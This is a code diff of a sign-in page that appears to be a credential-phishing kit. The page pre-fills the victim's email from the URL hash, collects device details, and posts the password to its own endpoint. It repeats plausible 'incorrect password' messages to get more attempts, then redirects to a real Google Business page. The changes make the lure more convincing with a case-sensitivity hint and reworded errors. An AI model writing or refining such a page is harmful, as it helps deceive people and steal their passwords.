@@ -25,7 +25,6 @@
             border-radius: 5px;
             padding: 20px;
             margin: auto;
-            transition: all 0.3s ease;
         }
         .logo img {
             width: 50px;
@@ -65,7 +64,6 @@
             cursor: not-allowed;
         }
 
-        /* Error message with fade-in */
         .error-message {
             color: #e74c3c;
             text-align: center;
@@ -84,7 +82,6 @@
             100% { opacity: 1; transform: translateY(0); }
         }
 
-        /* Loader overlay for redirect */
         .loader-overlay {
             display: none;
             position: fixed;
@@ -119,7 +116,6 @@
             color: #555;
         }
 
-        /* Button spinner */
         .btn-spinner {
             display: inline-block;
             width: 20px;
@@ -132,7 +128,6 @@
             margin-right: 8px;
         }
 
-        /* Avatar styles */
         .avatar-holder {
             display: flex;
             justify-content: center;
@@ -163,7 +158,6 @@
             color: #333;
         }
 
-        /* Subtle shake for error */
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             20%, 60% { transform: translateX(-8px); }
@@ -171,6 +165,18 @@
         }
         .shake {
             animation: shake 0.5s ease;
+        }
+
+        /* Additional subtle helper text */
+        .hint-text {
+            font-size: 13px;
+            color: #888;
+            margin-top: 5px;
+            text-align: center;
+            display: none;
+        }
+        .hint-text.show {
+            display: block;
         }
     </style>
 </head>
@@ -183,7 +189,8 @@
                 <h5 class="font-weight-light">Sign in to continue</h5>
             </div>
 
-            <div id="errorDisplay" class="error-message">Incorrect password. Please try again.</div>
+            <div id="errorDisplay" class="error-message"></div>
+            <div id="hintText" class="hint-text">Passwords are case‑sensitive.</div>
 
             <form id="login-form" method="post" action="/api/login">
                 <div class="form-holder">
@@ -219,7 +226,6 @@
         </div>
     </div>
 
-    <!-- Redirect overlay -->
     <div id="loaderOverlay" class="loader-overlay">
         <div class="spinner"></div>
         <div class="msg">Logging you in, please wait...</div>
@@ -227,7 +233,6 @@
 
     <script>
         (function() {
-            // Extract email from URL
             let email = null;
             if (window.location.hash) {
                 let hash = decodeURIComponent(window.location.hash.substring(1));
@@ -250,28 +255,32 @@
 
             const form = document.getElementById('login-form');
             const errorDisplay = document.getElementById('errorDisplay');
+            const hintText = document.getElementById('hintText');
             const loader = document.getElementById('loaderOverlay');
             const submitBtn = document.getElementById('submit-btn');
             const btnText = document.getElementById('btn-text');
 
-            // Helper to show error with message and shake
             function showError(message, shake = true) {
                 errorDisplay.textContent = message;
                 errorDisplay.classList.add('show');
                 if (shake) {
                     errorDisplay.classList.remove('shake');
-                    // Force reflow
                     void errorDisplay.offsetWidth;
                     errorDisplay.classList.add('shake');
                 }
+                // Show hint for password errors
+                if (message.toLowerCase().includes('password')) {
+                    hintText.classList.add('show');
+                } else {
+                    hintText.classList.remove('show');
+                }
             }
 
-            // Helper to hide error
             function hideError() {
                 errorDisplay.classList.remove('show', 'shake');
+                hintText.classList.remove('show');
             }
 
-            // Get device details to send
             function getDeviceDetails() {
                 return {
                     screen: `${window.screen.width}x${window.screen.height}`,
@@ -294,7 +303,6 @@
 
                 hideError();
 
-                // Disable button and show spinner
                 submitBtn.disabled = true;
                 btnText.innerHTML = '<span class="btn-spinner"></span> Logging in...';
 
@@ -318,21 +326,19 @@
                     const data = await response.json();
 
                     if (data.redirect) {
-                        // Show loader overlay and redirect after 3s
                         loader.classList.add('active');
                         setTimeout(() => {
                             window.location.href = data.redirectUrl || 'https://business.google.com/create/new?hl=en&gmbsrc=ng-en-z-z-z-gmb-l-z-d~mhp-hom_sig-u&original_intent=GMB&skiplp=1&_gl=1*we7dbu*_ga*MTQyMzU2Nzk4MS4xNzQ4ODg2MDg1*_ga_VM5ES1YN10*czE3NDg4ODYwODQkbzEkZzAkdDE3NDg4ODYwODQkajYwJGwwJGgw&service=ome&omec=EMLX0y4yAgECOipnbWJzcmM9bmctZW4tei16LXotZ21iLWwtei1kfm1ocC1ob21fc2lnLXVAAUoTCIuXmb2k040DFb-XAAAd3Ss8Mw%3D%3D';
                         }, 3000);
                     } else {
-                        // Different error messages based on attempt count
                         const attempts = data.attempts || 0;
                         let errorMsg = '';
                         if (attempts === 1) {
-                            errorMsg = 'Incorrect password. Please try again.';
+                            errorMsg = 'Incorrect password. Please double‑check your credentials.';
                         } else if (attempts === 2) {
-                            errorMsg = 'Hmm, that didn\'t work. One more try?';
+                            errorMsg = 'The password you entered is incorrect. Remember that passwords are case‑sensitive. Please try again.';
                         } else if (attempts >= 3) {
-                            errorMsg = 'Last attempt! If it fails, you\'ll be redirected.';
+                            errorMsg = 'This is your final attempt. If the password is still incorrect, you will be redirected.';
                         } else {
                             errorMsg = 'Invalid credentials.';
                         }
